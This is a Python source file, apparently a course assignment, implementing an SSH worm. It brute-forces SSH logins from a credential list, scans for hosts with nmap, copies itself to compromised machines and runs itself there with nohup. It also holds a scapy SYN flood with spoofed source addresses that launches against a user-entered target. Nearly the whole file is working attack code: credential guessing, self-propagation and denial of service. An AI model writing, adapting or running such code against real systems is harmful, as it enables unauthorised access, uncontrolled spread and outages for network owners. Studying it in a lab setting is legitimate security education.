import paramiko
import sys
import socket
import nmap
import os
import struct
import fcntl
import netifaces
import random
from scapy.all import *

# The list of credentials to attempt
credList = [
	('victim', 'victim')
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "./infected.txt"

##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def randomIP():
	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return ip

def randInt():
	x = random.randint(1000,9000)
	return x	

def SYN_Flood(dstIP,dstPort,counter):
	total = 0
	print ("Packets are sending ...")
	for x in range (0,counter):
		s_port = randInt()
		s_eq = randInt()
		w_indow = randInt()

		IP_Packet = IP ()
		IP_Packet.src = randomIP()
		IP_Packet.dst = dstIP

		TCP_Packet = TCP ()	
		TCP_Packet.sport = s_port
		TCP_Packet.dport = dstPort
		TCP_Packet.flags = "S"
		TCP_Packet.seq = s_eq
		TCP_Packet.window = w_indow

		send(IP_Packet/TCP_Packet, verbose=0)
		total+=1
	sys.stdout.write("\nTotal packets sent: %i\n" % total)

def info():
	os.system("clear")

	dstIP = input("\nTarget IP : ")
	dstPort = input("Target Port : ")
	
	return dstIP,int(dstPort)

def isInfectedSystem(ssh):
	# Check if the system as infected. One
	# approach is to check for a file called
	# infected.txt in directory /tmp (which
	# you created when you marked the system
	# as infected). 
	try:
		sftpClient = ssh.open_sftp()
		sftpClient.stat(INFECTED_MARKER_FILE)
		return True
	except:
		return False	

#################################################################
# Marks the system as infected
#################################################################
def markInfected():
	
	# Mark the system as infected. One way to do
	# this is to create a file called infected.txt
	# in directory /tmp/
	file_obj = open(INFECTED_MARKER_FILE, "w")
	file_obj.write("Has anyone really been far as decided to use even go want to do more like?")
	file_obj.close()

	dstIP,dstPort = info()
	counter = input("How many packets do you want to send : ")
	SYN_Flood(dstIP,dstPort,int(counter))
###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):
	
	# This function takes as a parameter 
	# an instance of the SSH class which
	# was properly initialized and connected
	# to the victim system. The worm will
	# copy itself to remote system, change
	# its permissions to executable, and
	# execute itself. Please check out the
	# code we used for an in-class exercise.
	# The code which goes into this function
	# is very similar to that code.	
	wormLoc = "./worm.py"	
	if len(sys.argv) >= 2:
		if sys.argv[1] == "--host":
			wormLoc = "worm.py"
	sftpClient = sshClient.open_sftp()
	sftpClient.put(wormLoc, "./worm.py")
	sshClient.exec_command("chmod a+x ./worm.py")
	sshClient.exec_command("nohup python ./worm.py &")
	


############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, _password, sshClient):
	
	# Tries to connect to host host using
	# the username stored in variable userName
	# and password stored in variable password
	# and instance of SSH class sshClient.
	# If the server is down	or has some other
	# problem, connect() function which you will
	# be using will throw socket.error exception.	     # Otherwise, if the credentials are not
	# correct, it will throw 
	# paramiko.SSHException exception. 
	# Otherwise, it opens a connection
	# to the victim system; sshClient now 
	# represents an SSH connection to the 
	# victim. Most of the code here will
	# be almost identical to what we did
	# during class exercise. Please make
	# sure you return the values as specified
	# in the comments above the function
	# declaration (if you choose to use
	# this skeleton).
	try:
		sshClient.connect(host, username=userName, password=_password)
		return 0
	except paramiko.ssh_exception.AuthenticationException:
		return 1
	except socket.error:
		return 3
		

###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):
	
	# The credential list
	global credList
	
	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
				
	# Go through the credential
	for (username, password) in credList:
		
		# TODO: here you will need to
		# call the tryCredentials function
		# to try to connect to the
		# remote system using the above 
		# credentials.  If tryCredentials
		# returns 0 then we know we have
		# successfully compromised the
		# victim. In this case we will
		# return a tuple containing an
		# instance of the SSH connection
		# to the remote system. 
		if tryCredentials(host, username, password, ssh) == 0:
			print ("Success with " + host + " " +  username + " " + password)
			return (ssh, username, password)
		elif tryCredentials(host, username, password, ssh) == 1:
			print ("Wrong Credentials on host " + host)
			continue
		elif tryCredentials(host, username, password, ssh) == 3:
			print ("No SSH client on " + host)
			break #no ssh client so just stop
	# Could not find working credentials
	return None	

####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The UP address of the current system
####################################################
def getMyIP(interface):
	# TODO: Change this to retrieve and
	# return the IP of the current system.
        # Open the socket 

        # Get all the network interfaces on the system
        networkInterfaces = netifaces.interfaces()
        print("NetworkInterfaces: ", networkInterfaces)
        # The IP address
        ipAddr = None

        # Go through all the interfaces
        for netFace in networkInterfaces:

                # The IP address of the interface
                addr = netifaces.ifaddresses(netFace)[2][0]['addr']
                print("addr qq: ", addr)
                # Get the IP address
                if not addr == "127.0.0.1":

                        # Save the IP addrss and break
                        ipAddr = addr
                        break

        return ipAddr



                                                             

#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():

	# TODO: Add code for scanning
	# for hosts on the same network
	# and return the list of discovered
	# IP addresses.	
	portScanner = nmap.PortScanner()
	portScanner.scan('127.0.0.1', '22-443')
	hostInfo = portScanner.all_hosts()

	print("qq: ", hostInfo)

	liveHosts = []
	ip_add = getMyIP(b"eth0")
	for host in hostInfo:
		if portScanner[host].state() == "up" and host != ip_add:
			liveHosts.append(host)

	return liveHosts

if __name__ == "__main__":
	# Get the hosts on the same network
	networkHosts = getHostsOnTheSameNetwork()
	print ("Found hosts: ", networkHosts)
	if not os.path.exists(INFECTED_MARKER_FILE):
		markInfected()
	else:
		print ("Already Infected")
		sys.exit()

	# Go through the network hosts
	for host in networkHosts:
		
		# Try to attack this host
		sshInfo =  attackSystem(host)
		
		print (sshInfo)
		
		
		# Did the attack succeed?
		if sshInfo:
			
			print ("Trying to spread")
			qq = isInfectedSystem(sshInfo[0])
			if qq == True:
				print ("Remote System is Infected")
				continue
			else:
				spreadAndExecute(sshInfo[0])
				print ("Spreading complete on " + host)
				sys.exit()